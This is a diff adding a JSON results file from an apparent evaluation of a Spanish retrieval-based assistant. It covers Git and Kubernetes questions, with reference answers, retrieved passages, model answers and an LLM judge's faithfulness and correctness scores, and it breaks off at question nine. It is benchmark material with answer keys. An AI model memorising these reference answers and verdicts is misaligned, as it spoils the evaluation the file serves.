@@ -1,0 +1,1459 @@
+{
+  "configuracion": "grafo_llm",
+  "fichero_respuestas": "eval/resultados/2026-11-21_1109_respuestas_grafo_llm.json",
+  "generador": {
+    "proveedor": "ollama",
+    "modelo": "qwen2.5:14b"
+  },
+  "juez": {
+    "proveedor": "groq",
+    "modelo": "openai/gpt-oss-120b"
+  },
+  "juez_igual_a_generador": false,
+  "juzgadas": 20,
+  "no_juzgadas": {
+    "no_aplica:no_lo_tengo": 2,
+    "sin_juzgar:restringido": 1,
+    "no_aplica:sin_respuesta": 5
+  },
+  "fidelidad_media": 0.958,
+  "todo_respaldado": "18/20",
+  "correccion": {
+    "correcta": 17,
+    "parcial": 3,
+    "incorrecta": 0
+  },
+  "preguntas": [
+    {
+      "id": 1,
+      "tipo": "codigo_exacto",
+      "pregunta": "¿Cómo rehago la última confirmación si me he equivocado en el mensaje?",
+      "con_respuesta": true,
+      "referencia": "Con git commit --amend, que rehace la última confirmación.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 13.66,
+      "respuesta": "Para rehacer la última confirmación y corregir un mensaje de confirmación incorrecto, puedes utilizar el comando `git commit --amend`. Este comando abrirá tu editor de texto predeterminado con el mensaje de la última confirmación ya cargado. Puedes editar este mensaje como lo harías normalmente y al guardar los cambios se sobrescribirá la confirmación anterior con la nueva [1][2].",
+      "respuesta_cruda": "Para rehacer la última confirmación y corregir un mensaje de confirmación incorrecto, puedes utilizar el comando `git commit --amend`. Este comando abrirá tu editor de texto predeterminado con el mensaje de la última confirmación ya cargado. Puedes editar este mensaje como lo harías normalmente y al guardar los cambios se sobrescribirá la confirmación anterior con la nueva [1][2].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Deshacer Cosas\nEn cualquier momento puede que quieras deshacer algo.\nAquí repasaremos algunas herramientas básicas usadas para deshacer cambios que hayas hecho.\nTen cuidado, a veces no es posible recuperar algo luego que lo has deshecho.\nEsta es una de las pocas áreas en las que Git puede perder parte de tu trabajo si cometes un error.  \nUno de las acciones más comunes a deshacer es cuando confirmas un cambio antes de tiempo y olvidas agregar algún archivo, o te equivocas en el mensaje de confirmación.\nSi quieres rehacer la confirmación, puedes reconfirmar con la opción `--amend`:  \n```\n$ git commit --amend\n```  \nEste comando utiliza tu área de preparación para la confirmación.",
+          "fuente": "11-git-deshacer-cambios.md",
+          "seccion": "Deshacer Cosas",
+          "confidencialidad": "publico",
+          "puntuacion": 0.8675
+        },
+        {
+          "texto": "Deshacer Cosas\n```\n$ git commit --amend\n```  \nEste comando utiliza tu área de preparación para la confirmación.\nSi no has hecho cambios desde tu última confirmación (por ejemplo, ejecutas este comando justo después de tu confirmación anterior), entonces la instantánea lucirá exactamente igual y lo único que cambiarás será el mensaje de confirmación.  \nSe lanzará el mismo editor de confirmación, pero verás que ya incluye el mensaje de tu confirmación anterior.\nPuedes editar el mensaje como siempre y se sobreescribirá tu confirmación anterior.  \nPor ejemplo, si confirmas y luego te das cuenta que olvidaste preparar los cambios de un archivo que querías incluir en esta confirmación, puedes hacer lo siguiente:  \n```\n$ git commit -m 'initial commit'\n$ git add forgotten_file\n$ git commit --amend\n```",
+          "fuente": "11-git-deshacer-cambios.md",
+          "seccion": "Deshacer Cosas",
+          "confidencialidad": "publico",
+          "puntuacion": 0.5744
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "Utilizar el comando git commit --amend para rehacer la última confirmación y corregir el mensaje.",
+            "respaldada": true
+          },
+          {
+            "texto": "El comando abre el editor predeterminado con el mensaje de la última confirmación cargado.",
+            "respaldada": true
+          },
+          {
+            "texto": "Al editar y guardar, se sobrescribe la confirmación anterior con el nuevo mensaje.",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 3,
+        "respaldadas": 3,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta incluye la información esencial del referencia (git commit --amend) y añade detalles que están respaldados por los documentos sin contradecir la referencia.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 2,
+      "tipo": "codigo_exacto",
+      "pregunta": "¿Cómo saco un archivo del área de preparación?",
+      "con_respuesta": true,
+      "referencia": "Con git reset HEAD <archivo>.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 13.32,
+      "respuesta": "Para sacar un archivo del área de preparación, debes usar el comando `git reset HEAD <archivo>`.\n\nPor ejemplo, si quieres deshacer la preparación del archivo `CONTRIBUTING.md`, ejecutarías:\n```\n$ git reset HEAD CONTRIBUTING.md\n```\n\nEste comando moverá los cambios en ese archivo desde el área de preparación al directorio de trabajo no confirmado [1][2].",
+      "respuesta_cruda": "Para sacar un archivo del área de preparación, debes usar el comando `git reset HEAD <archivo>`.\n\nPor ejemplo, si quieres deshacer la preparación del archivo `CONTRIBUTING.md`, ejecutarías:\n```\n$ git reset HEAD CONTRIBUTING.md\n```\n\nEste comando moverá los cambios en ese archivo desde el área de preparación al directorio de trabajo no confirmado [1][2].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Deshacer Cosas > Deshacer un Archivo Preparado\nLas siguientes dos secciones demuestran cómo lidiar con los cambios de tu área de preparación y tú directorio de trabajo.\nAfortunadamente, el comando que usas para determinar el estado de esas dos áreas también te recuerda cómo deshacer los cambios en ellas.\nPor ejemplo, supongamos que has cambiado dos archivos y que quieres confirmarlos como dos cambios separados, pero accidentalmente has escrito `git add *` y has preparado ambos.\n¿Cómo puedes sacar del área de preparación uno de ellos?\nEl comando `git status` te recuerda cómo:  \n```\n$ git add .\n$ git status\nOn branch master\nChanges to be committed:\n(use \"git reset HEAD <file>...\" to unstage)",
+          "fuente": "11-git-deshacer-cambios.md",
+          "seccion": "Deshacer Cosas > Deshacer un Archivo Preparado",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9698
+        },
+        {
+          "texto": "Deshacer Cosas > Deshacer un Archivo Preparado\nrenamed:    README.md -> README\nmodified:   CONTRIBUTING.md\n```  \nJusto debajo del texto ``Changes to be committed'' (``Cambios a ser confirmados'', en inglés), verás que dice que uses `git reset HEAD <file>...` para deshacer la preparación.\nPor lo tanto, usemos el consejo para deshacer la preparación del archivo `CONTRIBUTING.md`:  \n```\n$ git reset HEAD CONTRIBUTING.md\nUnstaged changes after reset:\nMCONTRIBUTING.md\n$ git status\nOn branch master\nChanges to be committed:\n(use \"git reset HEAD <file>...\" to unstage)\n\nrenamed:    README.md -> README\n\nChanges not staged for commit:\n(use \"git add <file>...\" to update what will be committed)\n(use \"git checkout -- <file>...\" to discard changes in working directory)",
+          "fuente": "11-git-deshacer-cambios.md",
+          "seccion": "Deshacer Cosas > Deshacer un Archivo Preparado",
+          "confidencialidad": "publico",
+          "puntuacion": 0.2242
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "Usar git reset HEAD <archivo> para sacar un archivo del área de preparación",
+            "respaldada": true
+          },
+          {
+            "texto": "Ejemplo: git reset HEAD CONTRIBUTING.md deshace la preparación de CONTRIBUTING.md",
+            "respaldada": true
+          },
+          {
+            "texto": "El comando mueve los cambios del área de preparación al directorio de trabajo no confirmado",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 3,
+        "respaldadas": 3,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta reproduce exactamente la instrucción del documento y coincide con la respuesta de referencia; no contiene errores ni información contradictoria.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 3,
+      "tipo": "factual",
+      "pregunta": "¿Qué es un fast-forward al fusionar ramas?",
+      "con_respuesta": true,
+      "referencia": "Cuando la confirmación a fusionar es accesible siguiendo directamente el historial de la otra, Git solo avanza el puntero de la rama, porque no hay trabajo divergente que combinar.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 13.48,
+      "respuesta": "Un \"avance rápido\" o \"fast forward\" en la fusión de ramas ocurre cuando Git puede mover directamente el apuntador de rama hacia adelante sin necesidad de crear una nueva confirmación de fusión. Esto sucede porque la confirmación que se está fusionando es un descendiente directo de la confirmación actual, por lo que no hay divergencias entre las ramas y Git simplemente avanza el puntero de la rama [1].",
+      "respuesta_cruda": "Un \"avance rápido\" o \"fast forward\" en la fusión de ramas ocurre cuando Git puede mover directamente el apuntador de rama hacia adelante sin necesidad de crear una nueva confirmación de fusión. Esto sucede porque la confirmación que se está fusionando es un descendiente directo de la confirmación actual, por lo que no hay divergencias entre las ramas y Git simplemente avanza el puntero de la rama [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Procedimientos Básicos para Ramificar y Fusionar > Procedimientos Básicos de Ramificación\nEsto se hace con el comando `git merge`:  \n```\n$ git checkout master\n$ git merge hotfix\nUpdating f42c576..3a0874c\nFast-forward\nindex.html | 2 ++\n1 file changed, 2 insertions(+)\n```  \nNotarás la frase ``Fast forward'' (``Avance rápido'', en inglés) que aparece en la salida del comando.\nGit ha movido el apuntador hacia adelante, ya que la confirmación apuntada en la rama donde has fusionado estaba directamente arriba respecto a la confirmación actual.\nDicho de otro modo: cuando intentas fusionar una confirmación con otra confirmación accesible siguiendo directamente el historial de la primera; Git simplifica las cosas avanzando el puntero, ya que no hay ningún otro trabajo divergente a fusionar. Esto es lo que se denomina ``avance rápido'' (``fast forward'').",
+          "fuente": "12-git-ramas-y-fusiones.md",
+          "seccion": "Procedimientos Básicos para Ramificar y Fusionar > Procedimientos Básicos de Ramificación",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9907
+        },
+        {
+          "texto": "Reorganizar el Trabajo Realizado > Reorganización Básica\nPor ejemplo, puedes lanzar los comandos:  \n```\n$ git checkout experiment\n$ git rebase master\nFirst, rewinding head to replay your work on top of it...\nApplying: added staged command\n```  \nHaciendo que Git vaya al ancestro común de ambas ramas (donde estás actualmente y de donde quieres reorganizar), saque las diferencias introducidas por cada confirmación en la rama donde estás, guarde esas diferencias en archivos temporales, reinicie (reset) la rama actual hasta llevarla a la misma confirmación que la rama de donde quieres reorganizar, y finalmente, vuelva a aplicar ordenadamente los cambios.  \nEn este momento, puedes volver a la rama `master` y hacer una fusión con avance rápido (fast-forward merge).  \n```\n$ git checkout master\n$ git merge experiment\n```",
+          "fuente": "13-git-rebase.md",
+          "seccion": "Reorganizar el Trabajo Realizado > Reorganización Básica",
+          "confidencialidad": "publico",
+          "puntuacion": 0.7263
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "Fast-forward ocurre cuando Git puede mover directamente el apuntador de rama hacia adelante sin crear una nueva confirmación de fusión.",
+            "respaldada": true
+          },
+          {
+            "texto": "Sucede porque la confirmación a fusionar es descendiente directo de la actual, sin divergencias, y Git avanza el puntero.",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 2,
+        "respaldadas": 2,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta del asistente reproduce fielmente la definición de fast-forward tal como aparece en los documentos y coincide con la respuesta de referencia.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 4,
+      "tipo": "factual",
+      "pregunta": "¿Cuál es la regla de oro del rebase?",
+      "con_respuesta": true,
+      "referencia": "No reorganizar nunca confirmaciones que ya se hayan enviado (push) a un repositorio público.",
+      "recall5": false,
+      "no_lo_tengo": true,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 13.07,
+      "respuesta": "No lo tengo en la documentación. Sin embargo, según el texto proporcionado [1], se menciona que reorganizar confirmaciones (commits) que ya estaban disponibles públicamente y sobre las cuales otros han basado su trabajo puede causar problemas y frustración. Por tanto, una regla de oro podría ser evitar hacer rebases en historiales públicos o compartidos para no afectar el trabajo de los demás.",
+      "respuesta_cruda": "No lo tengo en la documentación. Sin embargo, según el texto proporcionado [1], se menciona que reorganizar confirmaciones (commits) que ya estaban disponibles públicamente y sobre las cuales otros han basado su trabajo puede causar problemas y frustración. Por tanto, una regla de oro podría ser evitar hacer rebases en historiales públicos o compartidos para no afectar el trabajo de los demás.",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Reorganizar el Trabajo Realizado > Reorganizar una Reorganización\nSi reorganizas (rebase) confirmaciones (commits) que ya estaban disponibles públicamente y la gente había basado su trabajo en ellas, entonces prepárate para tener problemas, frustrar a tu equipo y ser despreciado por tus compañeros.  \nSi tu compañero o tú ven que aun así es necesario hacerlo en algún momento, asegúrense que todos sepan que deben ejecutar `git pull --rebase` para intentar aliviar en lo posible la frustración.",
+          "fuente": "13-git-rebase.md",
+          "seccion": "Reorganizar el Trabajo Realizado > Reorganizar una Reorganización",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0443
+        }
+      ],
+      "juez": {
+        "estado": "no_aplica",
+        "motivo": "no_lo_tengo"
+      }
+    },
+    {
+      "id": 5,
+      "tipo": "codigo_exacto",
+      "pregunta": "¿Cómo recupero los cambios que guardé con git stash?",
+      "con_respuesta": true,
+      "referencia": "Con git stash apply.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 13.98,
+      "respuesta": "Para recuperar los cambios guardados con `git stash`, puedes usar el comando `git stash apply`. Si quieres aplicar el último guardado, simplemente ejecutas:\n\n```\n$ git stash apply\n```\n\nSi deseas aplicar un guardado específico de tu lista de guardados (por ejemplo, `stash@{2}`), debes especificarlo así:\n```\n$ git stash apply stash@{2}\n```\n\nEsto intentará reintegrar los cambios del guardado en tu directorio de trabajo actual [1][2].",
+      "respuesta_cruda": "Para recuperar los cambios guardados con `git stash`, puedes usar el comando `git stash apply`. Si quieres aplicar el último guardado, simplemente ejecutas:\n\n```\n$ git stash apply\n```\n\nSi deseas aplicar un guardado específico de tu lista de guardados (por ejemplo, `stash@{2}`), debes especificarlo así:\n```\n$ git stash apply stash@{2}\n```\n\nEsto intentará reintegrar los cambios del guardado en tu directorio de trabajo actual [1][2].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Guardado rápido y Limpieza > Guardando rápido tu trabajo\nmodified:   lib/simplegit.rb\n```  \nAhora quieres cambiar de rama, pero no quieres hacer ``commit'', todavía, a lo que has estado trabajando; así que le harás un guardado rápido a los cambios.\nPara poner un nuevo guardado rápido en tus archivos, ejecuta `git stash` o `git stash save`:  \n```\n$ git stash\nSaved working directory and index state \\\n\"WIP on master: 049d078 added the index file\"\nHEAD is now at 049d078 added the index file\n(To restore them type \"git stash apply\")\n```  \nTu directorio de trabajo está limpio:  \n```\n$ git status\n# On branch master\nnothing to commit, working directory clean\n```  \nEn este punto, puedes fácilmente cambiar de ramas y hacer trabajos en otro lugar; tus cambios están guardados en tus archivos.",
+          "fuente": "14-git-stash-y-clean.md",
+          "seccion": "Guardado rápido y Limpieza > Guardando rápido tu trabajo",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9557
+        },
+        {
+          "texto": "Guardado rápido y Limpieza > Guardando rápido tu trabajo\nPara ver qué guardados rápidos has almacenado, puedes usar `git stash list`:  \n```\n$ git stash list\nstash@{0}: WIP on master: 049d078 added the index file\nstash@{1}: WIP on master: c264051 Revert \"added file_size\"\nstash@{2}: WIP on master: 21d80a5 added number to log\n```  \nEn este caso, dos guardados fueron hechos previamente, así que tienes tres diferentes trabajos guardados.\nPuedes volver a aplicar el que acabas de guardar utilizando el comando que se muestra en la salida de ayuda del comando original: `git stash apply`.\nSi quieres hacer entrada a uno de los guardados rápidos anteriores, puedes especificarlo poniendo su nombre de esta manera: `git stash apply stash@{2}`.\nSi no especificas un guardado, Git adopta el guardado más reciente e intenta hacerle entrada:  \n```\n$ git stash apply",
+          "fuente": "14-git-stash-y-clean.md",
+          "seccion": "Guardado rápido y Limpieza > Guardando rápido tu trabajo",
+          "confidencialidad": "publico",
+          "puntuacion": 0.8942
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "Para recuperar los cambios guardados con git stash, puedes usar el comando git stash apply.",
+            "respaldada": true
+          },
+          {
+            "texto": "Si quieres aplicar el último guardado, simplemente ejecutas git stash apply.",
+            "respaldada": true
+          },
+          {
+            "texto": "Si deseas aplicar un guardado específico (por ejemplo, stash@{2}), debes usar git stash apply stash@{2}.",
+            "respaldada": true
+          },
+          {
+            "texto": "Esto intentará reintegrar los cambios del guardado en tu directorio de trabajo actual.",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 4,
+        "respaldadas": 4,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta del asistente incluye la solución esencial indicada en la referencia (git stash apply) y añade información adicional que también está respaldada por los documentos, sin contradecir la respuesta de referencia.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 6,
+      "tipo": "codigo_exacto",
+      "pregunta": "¿Cómo veo qué borraría git clean sin borrar nada?",
+      "con_respuesta": true,
+      "referencia": "Con git clean -n (simulación); por ejemplo git clean -n -d.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 13.87,
+      "respuesta": "Para ver qué archivos y directorios removería `git clean` sin realmente eliminarlos, puedes ejecutar el comando con la opción `-n`. Esta opción simula lo que haría el comando sin realizar cambios en el sistema de archivos. Por ejemplo:\n\n```bash\n$ git clean -d -n\nWould remove test.o\nWould remove tmp/\n```\n\nEsta salida muestra los archivos y directorios que serían eliminados si ejecutas `git clean` con las mismas opciones, pero sin la opción `-n`. [1] [2]",
+      "respuesta_cruda": "Para ver qué archivos y directorios removería `git clean` sin realmente eliminarlos, puedes ejecutar el comando con la opción `-n`. Esta opción simula lo que haría el comando sin realizar cambios en el sistema de archivos. Por ejemplo:\n\n```bash\n$ git clean -d -n\nWould remove test.o\nWould remove tmp/\n```\n\nEsta salida muestra los archivos y directorios que serían eliminados si ejecutas `git clean` con las mismas opciones, pero sin la opción `-n`. [1] [2]",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Guardado rápido y Limpieza > Limpiando tu Directorio de Trabajo\n```\n$ git clean -d -n\nWould remove test.o\nWould remove tmp/\n```  \nPor defecto, el comando `git clean` sólo removerá archivos que no sean controlados y que no sean ignorados. Cualquier archivo que empareje en patrón en tu `.gitignore` u otros archivos ignorados no serán removidos. Si quieres eliminar esos archivos también, como eliminar todos los `.o` generados por la versión, así puedes hacer una versión completamente limpia, puedes añadir un `-x` al comando.  \n```\n$ git status -s\nM lib/simplegit.rb\n?? build.TMP\n?? tmp/",
+          "fuente": "14-git-stash-y-clean.md",
+          "seccion": "Guardado rápido y Limpieza > Limpiando tu Directorio de Trabajo",
+          "confidencialidad": "publico",
+          "puntuacion": 0.6993
+        },
+        {
+          "texto": "Guardado rápido y Limpieza > Limpiando tu Directorio de Trabajo\nAsumiendo que quieres eliminar los archivos cruft o limpiar tu directorio de trabajo, puedes hacerlo con `git clean`. Para remover los archivos que no están bajo el control de la versión en tu directorio de trabajo, puedes ejecutar `git clean -f -d`, el cual remueve cualquier archivo y también cualquier subdirectorio que se vuelva vacío como resultado. El `-f` significa 'fuerza' o “realmente haz esto”.  \nSi alguna vez quieres ver que haría, puedes ejecutar el comando con la opción `-n` que significa ``haz un arranque en seco y dime que habrías eliminado ''.  \n```\n$ git clean -d -n\nWould remove test.o\nWould remove tmp/\n```",
+          "fuente": "14-git-stash-y-clean.md",
+          "seccion": "Guardado rápido y Limpieza > Limpiando tu Directorio de Trabajo",
+          "confidencialidad": "publico",
+          "puntuacion": 0.5126
+        },
+        {
+          "texto": "Guardado rápido y Limpieza > Limpiando tu Directorio de Trabajo\n$ git clean -n -d -x\nWould remove build.TMP\nWould remove test.o\nWould remove tmp/\n```  \nSi no sabes lo que el comando `git clean` va a hacer, siempre ejecútalo con un `-n` primero para estar seguro antes de cambiar el `-n` a `-f` y hacerlo de verdad. La otra forma en la que puedes ser cuidadoso con el proceso es ejecutarlo con el `-i` o con la flag ``interactive''.  \nEsto ejecutará el comando en limpio en un modo interactivo.  \n```\n$ git clean -x -i\nWould remove the following items:\nbuild.TMP  test.o\n*** Commands ***\n1: clean                2: filter by pattern    3: select by numbers    4: ask each             5: quit\n6: help\nWhat now>\n```  \nDe esta forma puedes decidir por cada archivo individualmente o especificar los términos para la eliminación de forma interactiva.",
+          "fuente": "14-git-stash-y-clean.md",
+          "seccion": "Guardado rápido y Limpieza > Limpiando tu Directorio de Trabajo",
+          "confidencialidad": "publico",
+          "puntuacion": 0.1929
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "Ejecutar git clean con la opción -n muestra qué archivos y directorios se removerían sin eliminarlos",
+            "respaldada": true
+          },
+          {
+            "texto": "-n simula lo que haría el comando sin cambiar el sistema de archivos",
+            "respaldada": true
+          },
+          {
+            "texto": "Ejemplo: git clean -d -n muestra Would remove test.o y Would remove tmp/",
+            "respaldada": true
+          },
+          {
+            "texto": "La salida indica los archivos/directorios que serían eliminados si se ejecuta sin -n",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 4,
+        "respaldadas": 4,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta del asistente coincide con la referencia, proporcionando la opción -n (simulación) y un ejemplo, y todas sus afirmaciones están respaldadas por los documentos proporcionados.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 7,
+      "tipo": "factual",
+      "pregunta": "¿Cuándo se ejecuta el hook pre-commit y para qué se usa?",
+      "con_respuesta": true,
+      "referencia": "Es el primero en ejecutarse, antes de escribir el mensaje de confirmación. Se usa para inspeccionar lo que se va a confirmar, por ejemplo ejecutar pruebas o revisar el código.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 12.24,
+      "respuesta": "El punto de enganche `pre-commit` se activa antes de que teclées el mensaje de confirmación. Se utiliza para inspeccionar la instantánea (snapshot) que vas a confirmar, para verificar si has olvidado algo, asegurar que las pruebas se ejecutan o revisar cualquier aspecto del código que necesites inspeccionar [1].",
+      "respuesta_cruda": "El punto de enganche `pre-commit` se activa antes de que teclées el mensaje de confirmación. Se utiliza para inspeccionar la instantánea (snapshot) que vas a confirmar, para verificar si has olvidado algo, asegurar que las pruebas se ejecutan o revisar cualquier aspecto del código que necesites inspeccionar [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Puntos de enganche en Git > Puntos de enganche del lado cliente > Puntos en el flujo de trabajo de confirmación de cambios\nLos primeros cuatro puntos de enganche están relacionados con el proceso de\nconfirmación de cambios.  \nPrimero se activa el punto de enganche `pre-commit`, incluso antes de que\nteclees el mensaje de confirmación. Se suele utilizar para inspeccionar\nla instantánea (snapshot) que vas a confirmar, para ver si has olvidado\nalgo, para asegurar que las pruebas se ejecutan, o para revisar cualquier\naspecto que necesites inspeccionar en el código. Saliendo con un valor\nde retorno distinto de cero, se aborta la confirmación de cambios. Aunque\nsiempre puedes saltártelo con la orden `git commit --no-verify`. Puede ser\nútil para realizar tareas tales como revisar el estilo del código\n(lanzando `lint` o algo equivalente), revisar los espacios en blanco de",
+          "fuente": "15-git-hooks.md",
+          "seccion": "Puntos de enganche en Git > Puntos de enganche del lado cliente > Puntos en el flujo de trabajo de confirmación de cambios",
+          "confidencialidad": "publico",
+          "puntuacion": 0.3975
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "pre-commit se activa antes de que se escriba el mensaje de confirmación",
+            "respaldada": true
+          },
+          {
+            "texto": "se utiliza para inspeccionar la instantánea que se va a confirmar",
+            "respaldada": true
+          },
+          {
+            "texto": "se usa para verificar si se ha olvidado algo",
+            "respaldada": true
+          },
+          {
+            "texto": "se asegura de que se ejecuten las pruebas",
+            "respaldada": true
+          },
+          {
+            "texto": "se revisa cualquier aspecto del código que se necesite inspeccionar",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 5,
+        "respaldadas": 5,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta del asistente coincide con la información del documento y cubre todos los puntos de la respuesta de referencia sin contradicciones.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 8,
+      "tipo": "factual",
+      "pregunta": "¿Qué es un Pod en Kubernetes?",
+      "con_respuesta": true,
+      "referencia": "La unidad de computación desplegable más pequeña de Kubernetes: un grupo de uno o más contenedores con almacenamiento y red compartidos.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": [
+        "decidir",
+        "recuperar",
+        "evaluar",
+        "generar"
+      ],
+      "intentos": 0,
+      "error": null,
+      "segundos": 12.61,
+      "respuesta": "Un _Pod_ en Kubernetes es la unidad de computación desplegable más pequeña que puede crearse y gestionar. Esencialmente, un Pod (como una vaina biológica) agrupa uno o más contenedores con almacenamiento compartido, red compartida y especificaciones sobre cómo ejecutar los contenedores [1]. Los contenedores dentro de un Pod comparten la misma dirección IP y puerto, pueden comunicarse entre sí a través de `localhost` y utilizan IPC estándar como semáforos SystemV o memoria compartida POSIX para intercambiar datos [3].\n\nEl contexto compartido en un Pod incluye namespaces de Linux y cgroups, proporcionando un entorno similar al que ofrece Docker para los contenedores [3].",
+      "respuesta_cruda": "Un _Pod_ en Kubernetes es la unidad de computación desplegable más pequeña que puede crearse y gestionar. Esencialmente, un Pod (como una vaina biológica) agrupa uno o más contenedores con almacenamiento compartido, red compartida y especificaciones sobre cómo ejecutar los contenedores [1]. Los contenedores dentro de un Pod comparten la misma dirección IP y puerto, pueden comunicarse entre sí a través de `localhost` y utilizan IPC estándar como semáforos SystemV o memoria compartida POSIX para intercambiar datos [3].\n\nEl contexto compartido en un Pod incluye namespaces de Linux y cgroups, proporcionando un entorno similar al que ofrece Docker para los contenedores [3].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Pods > ¿Qué és un Pod?\nUn _Pod_ (como en una vaina de ballenas o vaina de guisantes) es un grupo de uno o más contenedores (como contenedores Docker), con almacenamiento/red compartidos, y unas especificaciones de cómo ejecutar los contenedores. Los contenidos de un Pod son siempre coubicados, coprogramados y ejecutados en un contexto compartido. Un Pod modela un \"host lógico\" específico de la aplicación: contiene uno o más contenedores de aplicaciones relativamente entrelazados. Antes de la llegada de los contenedores, ejecutarse en la misma máquina física o virtual significaba ser ejecutado en el mismo host lógico.  \nMientras que Kubernetes soporta más runtimes de contenedores a parte de Docker, este último es el más conocido y ayuda a describir Pods en términos de Docker.",
+          "fuente": "03-k8s-pods.md",
+          "seccion": "Pods > ¿Qué és un Pod?",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9996
+        },
+        {
+          "texto": "Pods\nLos _Pods_ son las unidades de computación desplegables más pequeñas que se pueden crear y gestionar en Kubernetes.",
+          "fuente": "03-k8s-pods.md",
+          "seccion": "Pods",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9946
+        },
+        {
+          "texto": "Pods > ¿Qué és un Pod?\nEl contexto compartido de un Pod es un conjunto de namespaces de Linux, cgroups y, potencialmente, otras facetas de aislamiento, las mismas cosas que aíslan un contenedor Docker. Dentro del contexto de un Pod, las aplicaciones individuales pueden tener más subaislamientos aplicados.  \nLos contenedores dentro de un Pod comparten dirección IP y puerto, y pueden encontrarse a través de `localhost`. También pueden comunicarse entre sí mediante comunicaciones estándar entre procesos, como semáforos de SystemV o la memoria compartida POSIX. Los contenedores en diferentes Pods tienen direcciones IP distintas y no pueden comunicarse por IPC sin configuración especial.\nEstos contenedores normalmente se comunican entre sí a través de las direcciones IP del Pod.",
+          "fuente": "03-k8s-pods.md",
+          "seccion": "Pods > ¿Qué és un Pod?",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9758
+        }
+      ],
+      "juez": {
+        "estado": "juzgada",
+        "afirmaciones": [
+          {
+            "texto": "Un Pod en Kubernetes es la unidad de computación desplegable más pequeña que puede crearse y gestionar.",
+            "respaldada": true
+          },
+          {
+            "texto": "Un Pod agrupa uno o más contenedores con almacenamiento compartido, red compartida y especificaciones sobre cómo ejecutar los contenedores.",
+            "respaldada": true
+          },
+          {
+            "texto": "Los contenedores dentro de un Pod comparten la misma dirección IP y puerto, pueden comunicarse entre sí a través de localhost y utilizan IPC estándar como semáforos SystemV o memoria compartida POSIX para intercambiar datos.",
+            "respaldada": true
+          },
+          {
+            "texto": "El contexto compartido en un Pod incluye namespaces de Linux y cgroups, proporcionando un entorno similar al que ofrece Docker para los contenedores.",
+            "respaldada": true
+          }
+        ],
+        "n_afirmaciones": 4,
+        "respaldadas": 4,
+        "fidelidad": 1.0,
+        "correccion": "correcta",
+        "motivo": "La respuesta del asistente coincide con la referencia y añade información adicional que está respaldada por los documentos, sin contradecirla.",
+        "intentos": 1
+      }
+    },
+    {
+      "id": 9,
+      "tipo": "numerico",
+      "pregunta": "Por defecto, ¿cuántos Pods pueden quedar no disponibles durante la actualización de un Deployment?",
+      "con_respuesta": true,
